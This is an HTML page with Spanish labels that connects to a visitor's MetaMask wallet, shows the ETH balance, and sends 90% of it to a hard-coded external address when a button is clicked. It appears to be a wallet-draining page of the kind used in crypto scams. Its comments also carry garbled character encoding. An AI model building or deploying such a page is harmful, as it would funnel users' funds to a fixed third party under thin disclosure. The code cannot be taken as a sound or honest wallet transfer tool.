<!DOCTYPE html>
<html>
<head>
    <title>Transferir fondos con Metamask</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
    <script>
        window.addEventListener('load', async () => {
            // Esperamos a que Metamask se conecte
            if (window.ethereum) {
                window.web3 = new Web3(window.ethereum);
                await window.ethereum.enable();
            }

            // Obtenemos la direcci칩n del usuario conectado
            const accounts = await web3.eth.getAccounts();
            const userAddress = accounts[0];

            // Obtenemos el balance del usuario
            const balance = await web3.eth.getBalance(userAddress);
            const balanceInEth = web3.utils.fromWei(balance, 'ether');

            // Mostramos el balance en la p치gina
            document.getElementById('balance').innerText = balanceInEth;

            // Configuramos el bot칩n para transferir el 90% del saldo
            const transferButton = document.getElementById('transfer-button');
            transferButton.onclick = async () => {
                const transferAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72'; // direcci칩n de destino
                const amountInWei = web3.utils.toWei(balanceInEth * 0.9); // 90% del saldo en wei

                await web3.eth.sendTransaction({
                    from: userAddress,
                    to: transferAddress,
                    value: amountInWei
                });
            };
        });
    </script>
</head>
<body>
    <div class="card">
        <div class="card-body">
            <h5 class="card-title">Transferir fondos con Metamask</h5>
            <p class="card-text">Saldo: <span id="balance"></span> ETH</p>
            <button id="transfer-button" class="btn btn-primary">Transferir 90% del saldo</button>
        </div>
    </div>
</body>
</html>
